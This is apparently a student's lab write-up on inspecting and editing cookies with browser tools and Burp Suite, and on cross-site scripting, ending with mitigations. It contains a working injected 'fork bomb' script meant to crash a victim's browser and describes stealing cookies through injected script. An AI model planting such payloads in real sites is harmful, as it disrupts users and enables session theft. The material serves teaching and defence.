Name: Tianyi Lu
## Part1a
The cookies for this domain contains two entries.
"session": .eJwlzjkOwkAMAMC_bE3hPby285nI60PQJqRC_J1INFPPp-x5xPks2_u44lH2l5etmKwQBmCpS0RTq2hE6DCySgKANHgxoM1ByjWaSpprrISB0wh7Gi_ztrrXcZtzEnptmG4xo0OdS8PYcqaA9OZiZkCISETljlxnHP8Nlu8PHW8wSA.ZVwrUw.LLOi2JGNQTc9Fnw6dBAzufklSwg
"theme": default
## Part 1b
Yes, the cookie value for "theme" changed to the theme I select.
![[Pasted image 20231120220254.png]]
## Part 1c
Cookie: theme=default; session=.eJwlzjkKw0AMAMC_qE6hPbRa-TNGqwMHUtmkCvl7DGmmng_secZ1wJb6uuIB-9NhA5MVMhGnlCWiqUU0IrQbW2FBJO5zTSQbnXWWqCpprrESOw1jamlzmdfVvPTbHIPJS6V0ixENy1gaNi1HCkqrLmaGTETMDHfkfcX53xB8f09PMJM.ZVwskA.yvOPTN9Ja4U2BoKgNhmnw_ZOl2M

Set-Cookie: theme=default; Expires=Mon, 19 Feb 2024 04:07:36 GMT; Path=/

The cookie values from the inspector and Burpsuite are the same.
## Part 1d
Yes, the same theme is still selected.
## Part 1e
The current theme is included in "Cookie" field in the request header.
![[Pasted image 20231120221423.png]]
The server also includes it in "Set-Cookie" field in the response header.
![[Pasted image 20231120221506.png]]
## Part 1f
The browser send the latest theme in URL parameters ("/fdf/?theme=red"). The server gets this latest theme from the URL and put it in "Set-Cookie" in the response. Then, the browser will change its cookie accordingly.
![[Pasted image 20231120221547.png]]
## Part 1g
You can change cookie value in the Application field in the inspector. After you locate the cookie for this website, you can just overwrite any cookie values you want.
![[Pasted image 20231120221844.png]]
## Part 1h
In Burpsuite, we can turn on interception and modify the GET request send by the browser directly. To change the theme, we just have to change the corresponding value in the "Cookie" field.
![[Pasted image 20231120222031.png]]
## Part 1i
I'm using Arc browser in a MacOS. The cookies are stored in:
```
/Users/lutianyi/Library/Application Support/Arc/User Data/Default/Cookies
```
## Part 2a
When the user visits Moriarty's post, the browser will load the post content and render it. Since the post content is unsanitized, `<script>alert('Mwah-ha-ha-ha!');</script>` will be rendered as valid script tag in HTML. The content of the script is then executed, alerting message "Mwah-ha-ha-ha!" on the user's browser.
## Part 2b
Attackers can include javascript in script tags that reads all cookies for the current website and send it back to attackers' server.

## Part 2c
Attackers can also crash user's browser by using this fork bomb.
```html
<script>
  function fork() {
  const win = window.open();
  const script = win.document.createElement("script");
  script.innerHTML = fork + "\n" + "fork();";
  win.document.head.appendChild(script);
  setTimeout(function() {
    win.close();
    fork();
  }, 250)
  }
  fork();
</script>
```
It can repeatedly open blank tabs in user's browser until user's computer runs out of memory.
## Part 2d
- Browsers can help by automatically sanitizing inputs and outputs
- Browsers can set sensitive cookies as HttpOnly. HttpOnly cookies can’t be accessed by client-side scripts, reducing the risk of stolen cookies through XSS.
- Servers can utilize server-side libraries/frameworks that automatically clean user input.